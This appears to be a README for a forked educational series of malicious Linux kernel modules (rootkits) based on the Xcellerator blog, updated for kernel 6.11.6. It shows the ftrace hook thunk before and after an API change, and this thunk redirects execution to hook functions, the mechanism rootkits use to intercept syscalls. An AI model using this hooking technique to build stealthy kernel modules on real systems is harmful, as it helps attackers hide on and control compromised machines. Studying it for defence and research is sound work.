# Linux-Rootkit-Series forked from Xcellerator

The Linux_kernel_hacking series with the xcellerator was amazing and inspired me to make an updated repo of his project and also make some minor changes since this will be working on 6.11.6. Understanding how these work opens you up to another other world.

This will aim to be a full series of individual malicious linux kernel modules for most recent kernel version 6.11.6.

** This is the link to the Xcellerator blog series https://xcellerator.github.io/posts/linux_rootkits_11/
---

# Changes from original copy of Xcellerators ftrace_helper.h library

  - This is the old function fh_ftrace_thunk() and its code below:
```
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}
```

  - This is the revised code of the function fh_ftrace_thunk() function below:

```
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    struct pt_regs *regs = ftrace_get_regs(fregs);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}
```




